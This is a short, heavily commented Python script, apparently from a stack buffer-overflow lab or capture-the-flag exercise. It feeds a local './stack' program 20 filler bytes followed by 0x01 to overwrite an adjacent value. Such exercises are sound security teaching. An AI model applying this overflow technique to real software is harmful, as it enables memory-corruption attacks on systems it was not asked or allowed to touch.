import subprocess  # Import the subprocess module to manage subprocesses.

# Start the stack process
# This creates a new process running the './stack' executable,
# with its standard input and output connected to pipes for communication.
process = subprocess.Popen(
    './stack',  # The command to execute the stack program.
    stdin=subprocess.PIPE,  # Allows sending input to the stack program.
    stdout=subprocess.PIPE,  # Captures the output from the stack program.
    stderr=subprocess.PIPE    # Captures any error messages from the stack program.
)

# Create the payload
# Here, we create a byte string to be sent to the stack process.
# It consists of 20 'W' characters followed by a specific byte (0x01) and a newline character.
payload = b'W' * 20 + b'\x01' + b'\n'

# Send the payload to the stack process and capture the output
# This sends the payload we just created to the process and waits for it to finish executing.
# The standard output and standard error of the process are captured in stdout and stderr.
stdout, stderr = process.communicate(payload)

# Print the output
# Decode the standard output from bytes to a string and print it.
print(stdout.decode())  # Displays the output of the stack program.

# Decode the standard error output (if any) from bytes to a string and print it.
print(stderr.decode())   # Displays any error messages generated by the stack program, if applicable.
